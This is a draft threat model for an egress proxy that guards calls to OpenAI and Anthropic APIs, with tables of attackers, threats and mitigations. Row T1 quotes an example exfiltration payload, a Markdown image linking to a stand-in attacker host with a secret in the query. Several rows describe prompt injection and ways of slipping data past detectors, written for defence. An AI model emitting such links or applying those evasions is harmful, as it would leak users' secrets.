# Threat model (draft)

- **Status:** Draft for external review. Not final until milestone M6.
- **Scope:** Resguardo v0.1: one process, OpenAI Chat Completions and Anthropic Messages, deterministic detectors, signed audit log.
- **Last updated:** 2026-11-25

This document says what Resguardo v0.1 protects, against whom, and, just as important, what it does **not** protect. Each mitigation points to the test that demonstrates it (golden cases G.x in the design document) or to the ADR that justifies it.

## 1. System

```text
 internal network (no internet)            │  external network
                                           │
 ┌──────────────┐  virtual key  ┌──────────┴────────────────────┐  real key, TLS  ┌───────────┐
 │ Application  │──────────────▶│ resguardo (single process)    │────────────────▶│ OpenAI /  │
 │ or agent     │◀──────────────│ identity → scan → policy →    │◀────────────────│ Anthropic │
 └──────────────┘  scanned      │ egress; response controls     │  stream         └───────────┘
                   response     └──────────────┬────────────────┘
                                               │ decision and outcome entries
                                               ▼
                                 audit log (hash chain, Ed25519) ──▶ auditor (public key only)
```

**Trust boundaries**

- **TB1, application → Resguardo:** the application is untrusted. It may be compromised or driven by injected instructions.
- **TB2, Resguardo → provider:** the provider is trusted to receive what policy allows, but its responses are untrusted (they may carry injected content).
- **TB3, Resguardo → disk:** the audit log and the keys live on the host.
- **TB4, audit log → auditor:** the auditor trusts only the public key.

## 2. Assets

| Asset | Why it matters |
| --- | --- |
| Personal data and secrets in prompts | The main thing Resguardo exists to keep in |
| Provider credentials (OpenAI, Anthropic keys) | Whoever holds them can call the provider directly, bypassing policy, and spend money |
| Virtual keys (`rsg_…`) | Grant a principal's allowances through Resguardo |
| Ed25519 signing key | Whoever holds it can forge receipts |
| Audit log | Evidence of what left and why |
| Policy and configuration | Define what may leave |
| Availability of LLM traffic | Resguardo is on the critical path (closed by default, ADR 0002) |

## 3. Assumptions

1. The application runs where it **cannot reach the internet except through Resguardo** (an internal Docker network in the lab). If this does not hold, Resguardo is advisory only.
2. The host running Resguardo, its OS and its filesystem permissions are not compromised.
3. Configuration and key files are deployed by an operator, not by the application.
4. TLS certificate validation of the providers' public endpoints is trustworthy.
5. The provider handles data it receives according to its own terms. Resguardo controls *what* is sent, not what the provider does with it.

## 4. Attackers

- **A1, injected instructions:** content (a document, web page or tool result) that makes the model or agent try to exfiltrate data. The most likely attacker.
- **A2, compromised or careless application:** code that sends sensitive data, tries other destinations or models, or tries to reach the internet directly.
- **A3, holder of a leaked virtual key** with network access to Resguardo.
- **A4, malicious input aimed at Resguardo itself:** crafted JSON, SSE streams or encodings meant to crash it, exhaust it or slip past the detectors.
- **A5, someone with write access to the audit log** after the fact, but without the private key.
- **A6, supply chain:** a compromised dependency or build.

## 5. Threats and mitigations

| # | Threat | Vector | Mitigation in v0.1 | Residual risk | Evidence |
| --- | --- | --- | --- | --- | --- |
| T1 | Exfiltration through the response after a prompt injection (A1) | The model emits `![x](https://attacker/?d=<secret>)` or a link the client renders or follows | Remote Markdown images are stripped; links to hosts outside `allowed_link_hosts` are stripped, including when split across SSE events | Plain-text URLs the user copies by hand; tools the application executes from the model's tool calls (Resguardo only scans their arguments); data the application forwards elsewhere | G.4, lab demo |
| T2 | Secrets or personal data sent to the provider (A1, A2) | Prompt, system message or tool results containing keys, DNI, IBAN, cards… | Deterministic detectors with checksums; NFKC, invisible-character and Base64/hex/URL-encoding decoding up to depth 2; per-class `redact` or `block`; block on any scan error | Data without a recognizable format (names, addresses, free text); new secret formats; encodings beyond depth 2 (only flagged); false negatives measured, not zero | G.1–G.3, `docs/ACCURACY.md` |
| T3 | Data sent to an unapproved destination or model (A2) | The application asks for another model, or for a provider URL it chooses | Closed by default: provider and model must be on the principal's list (exact match); upstreams fixed in config; HTTPS only; no redirects | Misconfigured allowlists | G.3, ADR 0002 |
| T4 | Bypassing the boundary (A2) | The application connects to the provider directly | The application runs on a network with no internet route (internal Docker network in the lab); the lab script checks that a direct connection fails | Entirely dependent on the operator's deployment; no `check` command in v0.1 (v0.2); Kubernetes and nftables guidance is v0.2 | Lab |
| T5 | Theft of provider credentials (A2) | Keys in the application's environment or code | The application only has a virtual key; real credentials are read only by `resguardo-egress` from an env var or a 0600 file, held in a zeroizing, non-printable type, never logged; any `Authorization`/`x-api-key` from the application is removed | Compromise of the Resguardo host or process memory (one process, ADR 0001) | G.3, ADR 0001 |
| T6 | Abuse of a leaked virtual key (A3) | Someone else uses `rsg_…` | 256-bit keys from the OS random generator, encoded without modulo bias; only the SHA-256 is stored; the key is printed once, on stdout only, never in `Debug` output, errors or logs; optional expiry (RFC 3339, enforced from that instant); a missing key, a non-`Bearer` scheme or two different keys in `Authorization` and `x-api-key` are rejected; per-key rate and size limits; listens on `127.0.0.1` by default; `rsg_` keys appearing in prompts are detected as secrets | No workload identity (mTLS, SPIFFE, OIDC) until v0.2; within its allowances, a stolen key works | G.3, F.2 |
| T7 | Crashing or exhausting Resguardo (A4) | Huge bodies, deep nesting, decode bombs, endless SSE streams, pathological regex input | Body and message limits; bounded decode depth and bytes; bounded SSE buffers and overlap window; linear-time `regex` crate; no `unsafe`; fuzzing of the SSE parser, normalization and decoders | A bug in a single process can bypass every control at once (ADR 0001); availability loss blocks all traffic | Fuzzing in M4 and M6, chaos tests |
| T8 | Slipping data past the detectors (A4) | Zero-width characters, full-width digits, Base64 or hex wrapping, splitting across SSE chunks | NFKC with a position map, invisible characters removed and reported, decoding layers, 256-byte overlap window in streams | Encodings not covered (base32, ROT13, compression…), semantic paraphrase, data split across separate requests | G.2, G.4 |
| T9 | Data already streamed before a block (A1) | In `passthrough_abort` mode, a secret is detected after earlier chunks were delivered | `buffer` mode for sensitive principals; the stream is cut with an error event as soon as a blocking finding appears | Content already sent is not recoverable; documented in the README | G.4 |
| T10 | Tampering with the audit log (A5) | Edit, delete or reorder entries | SHA-256 hash chain, RFC 8785 canonicalization, an Ed25519 signature per entry, `verify-log` | Whoever holds the private key can rewrite the whole log consistently; no timestamping or external anchoring until v0.2 | G.5, ADR 0003 |
| T11 | The audit log becomes a leak | Prompts or matched values written to the log or to debug logs | The log holds metadata only; findings never carry the value; error messages never include it; rule: no content in any log | Metadata (principal, model, sizes, timing) is still visible to log readers | G.5 (DNI and key not found in the log) |
| T12 | Losing the receipt for a request | Disk full, key missing, write error | The decision entry is written and flushed **before** sending; if that fails, `AUDIT_UNAVAILABLE` and nothing leaves | Availability; outcome entries can be lost on a crash after sending | G.3, chaos tests |
| T13 | Mixing principals | One workload uses another's allowances | One principal per virtual key; per-principal models, limits, actions and stream mode | Operators reusing one key for several workloads | Config tests |
| T14 | Unsafe configuration | `http://` upstream, wide file permissions, missing fields | The config is validated at startup and by `config check`; Resguardo refuses to start; `allow_insecure_upstream` only for local hosts, with a warning | Policies that are valid but too permissive | Config tests |
| T15 | Cost or quota abuse (A1, A2, A3) | Agent loops, large requests | Per-key requests per minute and body size limits | No token budgets or `max_tokens` cap until v0.2; streaming cost not estimated | — |
| T16 | Supply chain (A6) | A malicious or vulnerable dependency | `cargo deny`: advisories, allowed licenses and sources; few dependencies; no `unsafe` in our code | Transitive compromise not caught by advisories; no `cargo-vet`, SBOM or signed builds in v0.1 (SBOM and attestations if time allows) | `deny.toml` |
| T17 | Side channels | DNS queries, timing, response sizes | Not addressed beyond the lab's network isolation | Low-bandwidth channels remain | — |
| T18 | Information leak through endpoints | `/metrics`, `/healthz`, error bodies | `/metrics` only on the local interface and without content; errors carry only code, class and request id | — | Contract tests |
| T19 | Parser differential (A2, A4) | The body is crafted so the scanner and the provider read different values: duplicate keys, escaped key names, a query string, fields outside the conversation | Strict parsing: duplicate keys (after unescaping), invalid UTF-8, unpaired surrogates and trailing data are rejected; every string in the body is scanned, not only known fields; only known query parameters pass; the upstream path is fixed, never taken from the client (ADR 0007) | Binary payloads and numbers are not scanned; header values are covered in M1.5 | `resguardo-proto` tests |

## 6. If a component is compromised

| Compromised | What the attacker gets | What stays protected |
| --- | --- | --- |
| The application or agent | Sending requests through Resguardo within its principal's allowances | Destinations and models outside the list, provider credentials, the audit log |
| A virtual key | The same as the application, for that principal, until expiry or removal | Other principals; provider credentials |
| **The Resguardo process** (for example, a parser bug) | **Everything:** detectors, policy, egress rules and provider credentials. v0.1 has no process separation (ADR 0001) | Audit entries already written stay verifiable; the attacker can sign new ones |
| The host | Everything, including the signing key | Only copies of the log kept elsewhere |

This is the biggest difference from the target architecture, where a compromised decision process still could not reach unlisted destinations or the credentials. v0.2 closes the gap by splitting `front` and `connect`.

## 7. Explicitly not protected in v0.1

- Personal data without a structured format: names, addresses, health information in free text.
- Prompt injection itself. Resguardo limits what an injection can send out; it does not detect it.
- Actions the application takes on its own: tool execution, MCP traffic, other HTTP calls (assumption 1).
- Embeddings, images, audio, the Responses API and other providers: those routes return 404 and are not proxied.
- Images, audio and PDFs **inside** a chat request (base64 or `data:` URLs) are forwarded without scanning; their count is recorded. Text hidden in them is not detected (ADR 0007).
- Numbers in the JSON body are not scanned: a card number sent as a JSON number is not detected.
- Restoring redacted values in responses.
- Anything once the host is compromised.

## 8. Questions for the external reviewer

1. Is any important threat missing for an egress proxy deployed in front of a single application?
2. With one process, is "fail closed on every error" enough, or should the egress crate repeat a minimal secret check as a second opinion, as the two-process design proposed?
3. Is one signature per entry, with no external anchoring, honest enough for v0.1 if the README states the limit?
4. Is the default `passthrough_abort` stream mode the right default, or should `buffer` be the default?
5. Is the internal-network lab a convincing demonstration of "no bypass" for a reader who will deploy it differently?
